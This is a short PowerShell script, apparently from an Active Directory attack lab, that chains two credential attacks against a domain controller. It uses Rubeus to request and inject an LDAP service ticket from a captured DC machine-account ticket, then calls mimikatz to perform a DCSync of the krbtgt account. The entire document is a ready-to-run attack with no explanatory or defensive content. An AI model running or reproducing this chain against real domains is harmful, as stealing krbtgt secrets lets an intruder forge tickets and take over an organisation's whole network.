[CmdletBinding()]
param(
    [string]$Kirbi = "C:\Tools\cadre-attack\T102-capture\dc02.kirbi"
)
$ErrorActionPreference = "Continue"

$rubeus = 'C:\Tools\ADTools\Rubeus.exe'
$mimi = 'C:\Tools\ADTools\mimikatz.exe'

Write-Output '--- Step 1: Rubeus asktgs for ldap service using dc02$ TGT ---'
& $rubeus asktgs /ticket:$Kirbi /service:LDAP/dc02.child.cadre.local /dc:dc02.child.cadre.local /ptt 2>&1 | ForEach-Object { Write-Output "ASKTGS|$_" }

Start-Sleep -Seconds 2

Write-Output '--- Step 2: DCSync krbtgt with preloaded service ticket ---'
& $mimi "privilege::debug" "kerberos::list" "lsadump::dcsync /domain:child.cadre.local /user:krbtgt" "exit" 2>&1 | ForEach-Object { Write-Output "MIMI|$_" }
